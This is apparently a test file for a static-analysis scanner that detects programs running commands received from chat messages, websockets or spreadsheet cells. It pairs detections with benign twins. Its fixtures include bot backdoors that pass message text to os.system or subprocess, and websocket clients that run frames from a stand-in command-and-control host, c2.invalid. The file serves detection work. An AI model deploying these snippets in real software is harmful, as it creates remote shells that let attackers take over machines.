"""A command a message, a socket or a service handed the program, run (`flows/received_run.py`).

Every source is written fresh for the test and only parsed: hosts are under `.invalid` and nothing
here is run. The twins are the ordinary programs that read the same channels.
"""

from __future__ import annotations

from cordon_scanner.analysis.python.pyast import PythonAnalyzer
from cordon_scanner.foundation.capabilities import Capability


class RunKit:
    @staticmethod
    def received(source: str) -> list[str]:
        return [
            h.detail
            for h in PythonAnalyzer.analyse(source)
            if h.capability is Capability.FETCH_EXEC and h.detail.startswith("received run:")
        ]


class TestWhatAMessageHandlerRuns:
    def test_a_bot_runs_the_text_of_a_message(self) -> None:
        source = (
            "import os\n"
            "from telegram.ext import ApplicationBuilder, CommandHandler\n"
            "async def run(update, context):\n"
            "    os.system(update.message.text)\n"
            "app = ApplicationBuilder().token('t.invalid').build()\n"
            "app.add_handler(CommandHandler('run', run))\n"
        )
        assert RunKit.received(source) == ["received run: os.system at=call"]

    def test_a_decorated_handler(self) -> None:
        source = (
            "import subprocess\n"
            "import telebot\n"
            "@bot.message_handler(commands=['sh'])\n"
            "def sh(message):\n"
            "    subprocess.run(message.text, shell=True)\n"
        )
        assert RunKit.received(source) == ["received run: subprocess.run at=call"]

    def test_the_run_is_in_a_helper_reached_through_a_thread(self) -> None:
        source = (
            "import asyncio, subprocess\n"
            "def run_cmd(cmd):\n"
            "    return subprocess.check_output(cmd.split())\n"
            "async def handler(update, context):\n"
            "    text = update.message.text\n"
            "    await asyncio.to_thread(run_cmd, text)\n"
            "app.add_handler(MessageHandler(None, handler))\n"
        )
        assert RunKit.received(source) == ["received run: run_cmd runs a received command at=call"]

    def test_a_polled_batch_of_messages(self) -> None:
        source = (
            "import os, requests\n"
            "def poll(bot):\n"
            "    for update in bot.getUpdates():\n"
            "        os.system(update.message.text)\n"
        )
        assert RunKit.received(source) == ["received run: os.system at=call"]

    def test_a_handler_by_its_signature_with_the_runner_in_another_module(self) -> None:
        source = (
            "import asyncio\n"
            "import subprocess\n"
            "from telegram.ext import ContextTypes\n"
            "def run_cmd(cmd):\n"
            "    return subprocess.check_output(cmd.split())\n"
            "async def com_command(update, context):\n"
            "    text = update.message.text\n"
            "    await asyncio.to_thread(run_cmd, text)\n"
        )
        assert RunKit.received(source) == ["received run: run_cmd runs a received command at=call"]

    def test_the_runner_named_through_its_module(self) -> None:
        source = (
            "import asyncio\n"
            "import subprocess\n"
            "from telegram.ext import ContextTypes\n"
            "def run_cmd(cmd):\n"
            "    return subprocess.check_output(cmd.split())\n"
            "async def com(update, context):\n"
            "    await asyncio.to_thread(run_cmd, update.message.text.strip())\n"
        )
        assert RunKit.received(source) == ["received run: run_cmd runs a received command at=call"]

    def test_a_message_decoded_and_handed_to_a_command_runner(self) -> None:
        source = (
            "import base64\n"
            "import subprocess\n"
            "import telebot\n"
            "def execute_command(cmd):\n"
            "    subprocess.run(cmd, shell=True)\n"
            "def handle_command(message):\n"
            "    cmd = base64.b64decode(message.get('command')).decode()\n"
            "    execute_command(cmd)\n"
        )
        assert RunKit.received(source) == [
            "received run: subprocess.run at=call",
            "received run: execute_command runs a received command at=call",
        ]


class TestWhatAnotherChannelHandsTheProgram:
    def test_a_websocket_frame_run_in_a_shell(self) -> None:
        source = (
            "import subprocess, websockets\n"
            "async def main():\n"
            "    async with websockets.connect('wss://c2.invalid/ws') as ws:\n"
            "        await ws.send('ready')\n"
            "        while True:\n"
            "            cmd = await ws.recv()\n"
            "            subprocess.run(cmd, shell=True)\n"
        )
        assert RunKit.received(source) == ["received run: subprocess.run at=call"]

    def test_a_loop_over_the_frames(self) -> None:
        source = (
            "import os, websockets\n"
            "async def main():\n"
            "    ws = await websockets.connect('wss://c2.invalid/ws')\n"
            "    async for frame in ws:\n"
            "        os.system(frame)\n"
        )
        assert RunKit.received(source) == ["received run: os.system at=call"]

    def test_a_spreadsheet_cell_run_at_load(self) -> None:
        source = (
            "import os\n"
            "def cells(service):\n"
            "    return service.spreadsheets().values().get(spreadsheetId='s', range='A1').execute()\n"
            "rows = cells(build('sheets', 'v4'))\n"
            "os.system(rows['values'][0][0])\n"
        )
        assert RunKit.received(source) == ["received run: os.system at=load"]


class TestAHandlerOfAnOwnWireProtocol:
    def test_a_handler_given_the_connection_and_the_message_runs_it(self) -> None:
        source = (
            "import base64\nimport subprocess\n"
            "def handle_command(conn, message):\n"
            "    cmd = base64.b64decode(message['command']).decode()\n"
            "    subprocess.run(cmd, shell=True)\n"
        )
        assert RunKit.received(source) == ["received run: subprocess.run at=call"]

    def test_the_same_handler_answering_with_a_fixed_reply_does_not(self) -> None:
        source = "def handle_command(conn, message):\n    conn.send(b'ok')\n"
        assert RunKit.received(source) == []


class TestOrdinaryProgramsOnTheSameChannels:
    def test_a_chat_bot_that_replies_with_text(self) -> None:
        source = (
            "async def echo(update, context):\n"
            "    await update.message.reply_text(update.message.text.upper())\n"
            "app.add_handler(MessageHandler(None, echo))\n"
        )
        assert RunKit.received(source) == []

    def test_a_handler_that_runs_a_fixed_command(self) -> None:
        source = (
            "import os\n"
            "async def status(update, context):\n"
            "    os.system('uptime')\n"
            "    await update.message.reply_text('ok')\n"
            "app.add_handler(CommandHandler('status', status))\n"
        )
        assert RunKit.received(source) == []

    def test_a_handler_that_starts_a_named_program_with_the_text_as_data(self) -> None:
        source = (
            "import subprocess\n"
            "def lookup(update, context):\n"
            "    subprocess.run(['whois', update.message.text])\n"
            "app.add_handler(CommandHandler('whois', lookup))\n"
        )
        assert RunKit.received(source) == []

    def test_an_rpc_server_dispatching_to_a_fixed_table(self) -> None:
        source = (
            "import websockets, json\n"
            "TABLE = {'add': lambda a, b: a + b}\n"
            "async def serve(ws):\n"
            "    async for frame in ws:\n"
            "        call = json.loads(frame)\n"
            "        await ws.send(str(TABLE[call['fn']](*call['args'])))\n"
        )
        assert RunKit.received(source) == []

    def test_a_handler_that_hands_the_text_to_a_query_function(self) -> None:
        source = (
            "from .store import run_query\n"
            "def handle_search(message):\n"
            "    return run_query(message.text)\n"
        )
        assert RunKit.received(source) == []

    def test_a_job_runner_reading_its_spec_from_a_file(self) -> None:
        source = (
            "import json, subprocess\n"
            "spec = json.load(open('job.json'))\n"
            "subprocess.run(['make', spec['target']], check=True)\n"
        )
        assert RunKit.received(source) == []

    def test_a_command_line_tool_whose_commands_take_a_message(self) -> None:
        source = (
            "import click, subprocess\n"
            "@click.command()\n"
            "@click.argument('message')\n"
            "def commit(message):\n"
            "    subprocess.run(message, shell=True)\n"
            "def handle_message(message):\n"
            "    subprocess.run(message, shell=True)\n"
        )
        assert RunKit.received(source) == []

    def test_a_handler_given_only_a_message_and_no_chat_library(self) -> None:
        source = "import subprocess\ndef handle_message(message):\n    subprocess.run(message, shell=True)\n"
        assert RunKit.received(source) == []

    def test_a_pipe_read_with_no_size_is_a_local_process(self) -> None:
        source = "import os\ndef worker(conn):\n    os.system(conn.recv())\n"
        assert RunKit.received(source) == []
